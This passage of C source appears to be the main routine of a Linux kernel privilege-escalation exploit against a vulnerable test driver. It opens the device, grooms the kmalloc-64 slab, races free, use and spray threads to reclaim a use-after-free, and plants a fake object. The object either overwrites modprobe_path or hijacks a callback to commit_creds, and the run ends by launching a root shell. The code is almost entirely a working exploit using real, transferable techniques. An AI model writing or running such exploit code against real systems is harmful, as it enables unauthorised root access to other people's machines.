        fprintf(stderr, "    Falling back to callback-overwrite method\n");
    }

    /* ---- Step 2: Open the vulnerable device ---- */
    printf("[*] Opening %s...\n", devpath);
    vuln_fd = open(devpath, O_RDWR);
    if (vuln_fd < 0) {
        perror("open device");
        return 1;
    }

    /* ---- Step 3: Allocate the target object ---- */
    printf("[*] Allocating target vuln_obj (id=0x%x)...\n", target_id);
    struct vuln_alloc_arg aa = {
        .size = 64,
        .id   = target_id,
    };
    if (ioctl(vuln_fd, VULN_ALLOC, &aa) < 0) {
        perror("VULN_ALLOC");
        return 1;
    }

    /* ---- Step 4: Prepare escalation artifacts ---- */
    if (modprobe_path_addr) {
        printf("[*] Using modprobe_path overwrite technique\n");
        printf("[+] modprobe_path @ 0x%lx\n", modprobe_path_addr);
        prepare_modprobe_script();
    }

    /* ---- Step 5: Heap grooming — pre-fill the slab ---- */
    printf("[*] Heap grooming: pre-filling kmalloc-64 slab...\n");
    msg_spray_init();

    /* Fill the slab so the next free goes to the partial slab list,
     * making reclaim more predictable. */
    char filler[16];
    memset(filler, 0x42, sizeof(filler));
    msg_spray_send(filler, sizeof(filler));

    /* ---- Step 6: Build the fake object for reclaim ---- */
    struct vuln_obj fake;
    if (modprobe_path_addr) {
        /* For modprobe_path approach, we need arbitrary write.
         * We reclaim the freed slot with a fake object whose data[]
         * we can then write to via VULN_EDIT. But to get arbwrite
         * we need a slightly different technique:
         *
         * Approach: Use the UAF to create a dangling pointer. After
         * free, reclaim with a msg_msg or key payload that places a
         * pointer to modprobe_path where the driver expects obj->data
         * to be. Then VULN_EDIT writes our path to modprobe_path.
         *
         * The vuln_obj layout:
         *   offset 0:  id (4 bytes)
         *   offset 4:  size (4 bytes)
         *   offset 8:  callback (8 bytes)
         *   offset 16: data[48]
         *
         * If the driver's VULN_EDIT does:
         *   copy_from_user(obj->data, arg->buf, arg->len)
         * and obj is the dangling pointer to our reclaimed memory,
         * then writing to obj->data writes at offset 16 of our
         * reclaimed object.
         *
         * For arbwrite, we need obj->data to point to modprobe_path.
         * But obj->data is an inline char array, not a pointer.
         *
         * Alternative: If the driver stores a separate pointer to
         * obj->data (e.g., obj->data_ptr = obj->data at alloc time),
         * and we can corrupt data_ptr via the reclaim, then VULN_EDIT
         * writes to data_ptr which we set to modprobe_path.
         *
         * For this PoC, let's assume the driver has:
         *   struct vuln_obj {
         *       uint32_t id;
         *       uint32_t size;
         *       void *callback;
         *       void *data_ptr;   // points to data[] or separate alloc
         *       char data[40];
         *   };
         *
         * Then we set data_ptr = modprobe_path_addr in our fake object.
         */
        memset(&fake, 0, sizeof(fake));
        fake.id       = target_id;
        fake.size     = 48;
        fake.callback = NULL;
        /* data_ptr would be at offset 16 in the modified layout */
        unsigned long *data_ptr_slot = (unsigned long *)&fake.data[0];
        *data_ptr_slot = modprobe_path_addr;
    } else {
        /* Callback overwrite approach */
        build_fake_obj_callback(&fake, target_id, commit_creds_addr);
    }

    /* ---- Step 7: Launch the UAF race ---- */
    printf("[*] Launching UAF race (free vs use vs spray)...\n");

    ret = pthread_create(&t_free, NULL, thread_free, &target_id);
    if (ret) { fprintf(stderr, "pthread_create free: %s\n", strerror(ret)); return 1; }

    ret = pthread_create(&t_use, NULL, thread_use, &target_id);
    if (ret) { fprintf(stderr, "pthread_create use: %s\n", strerror(ret)); return 1; }

    ret = pthread_create(&t_spray, NULL, thread_spray, &fake);
    if (ret) { fprintf(stderr, "pthread_create spray: %s\n", strerror(ret)); return 1; }

    /* Start the race */
    race_go = 1;

    /* Wait a bit for the race to produce the UAF + reclaim */
    usleep(500000);
    race_done = 1;

    pthread_join(t_free, NULL);
    pthread_join(t_use, NULL);
    pthread_join(t_spray, NULL);

    printf("[*] Race complete.\n");

    /* ---- Step 8: Trigger the escalation ---- */
    if (modprobe_path_addr) {
        printf("[*] Writing modprobe_path via VULN_EDIT on dangling pointer...\n");

        /* The dangling pointer in the driver now points to our reclaimed
         * object where data_ptr = modprobe_path_addr.
         * VULN_EDIT will copy_from_user(obj->data_ptr, user_buf, len)
         * which writes our path to modprobe_path. */
        struct vuln_edit_arg ea = {
            .id  = target_id,
            .buf = MODPROBE_SCRIPT,
            .len = strlen(MODPROBE_SCRIPT) + 1,
        };
        ioctl(vuln_fd, VULN_EDIT, &ea);

        printf("[*] Triggering modprobe execution...\n");
        trigger_modprobe();

        if (check_rootshell()) {
            printf("[+] Escalation successful!\n");
            execl(ROOTSHELL, ROOTSHELL, NULL);
        } else {
            printf("[-] Root shell not found. Exploit may have failed.\n");
            printf("    Check dmesg for kernel panics or driver errors.\n");
        }
    } else {
        /* Callback approach: trigger VULN_USE to call our gadget */
        printf("[*] Triggering callback via VULN_USE...\n");
        struct vuln_use_arg ua = {
            .id  = target_id,
            .buf = NULL,
            .len = 0,
        };
        ioctl(vuln_fd, VULN_USE, &ua);

        if (getuid() == 0) {
            printf("[+] Got root! uid=%d\n", getuid());
            get_shell();
        } else {
            printf("[-] Not root (uid=%d). Exploit may have failed.\n", getuid());
        }
    }

    /* ---- Cleanup ---- */
    keyctl_free_all();
    close(vuln_fd);
    return 0;
}
